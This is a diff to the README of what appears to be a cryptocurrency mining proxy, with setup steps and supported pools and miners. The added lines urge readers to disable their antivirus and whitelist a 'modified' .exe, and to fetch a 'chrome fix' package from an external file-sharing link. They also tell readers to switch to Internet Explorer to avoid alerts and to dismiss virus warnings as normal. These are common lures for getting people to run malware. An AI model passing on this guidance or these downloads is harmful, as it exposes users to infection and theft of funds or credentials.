@@ -1,5 +1,5 @@
 # submitonlyhighsharesproxy
-submit high shares only skip low shares written in python all you need todo is download it extract file, run python3 -m pip install -r requirements.txt then run python3 submit-highshares.py
+submit high shares only skip low shares written in python all you need todo is download it extract file, open cmd terminal run python3 -m pip install -r requirements.txt then run python3 submit-highshares.py or launch the .exe compiled with visual studio 2022
 input your pool address like stratum://k1pool.com port is ur miners port to pool
 input ur miner address with worker name thats it and hit run
 This is working with latest miner software like gminer , lolminer,nbminer & trex miner
@@ -16,15 +16,22 @@ add low share option incase a user wants low shares solo or both shares solo
 fyi works on shared or solo, solo is best :)
 
 just added discord feature for notifications,
-just add your disocrd username with hashtags for notifications when block is found.
+just add your disocrd username/handle with hashtags for notifications when block is found. and to alert when miner goes offline
 
-if ur av detects abnormal its ot bcuz its a modified .exe file so add turn of av go to add acception then re-enable ur av
+if ur av detects abnormal its bcuz its a modified .exe file so turn of av go to add acception then re-enable ur av
 some avs i have tested and nothing apart from 1 only bcuz its a modified .exe
+
+issues with chrome fix
+download package https://mega.nz/file/IuxUTa5B#CULTICk3sUA-tIjI8m5njk8vhwh2R0ZyfAp67R68E_k
+or reopen github with internet explorer no alerts
+google chrome detects it as virus but thats normal as its a custom .exe
+please dont worry its normal for this to happen.
 
 tested on
 k1pool
 2miners
 solopool
+
 software used
 
 gminer
@@ -33,7 +40,7 @@ trex miner
 nbminer
 
 works with connection to mining rig rentals not sure if good idea 2 proxys running ,
-can be edited to run through nicehash if u no how 
+can be edited to run through nicehash if u no how i will look at this over the coming weeks
 
 todo
 
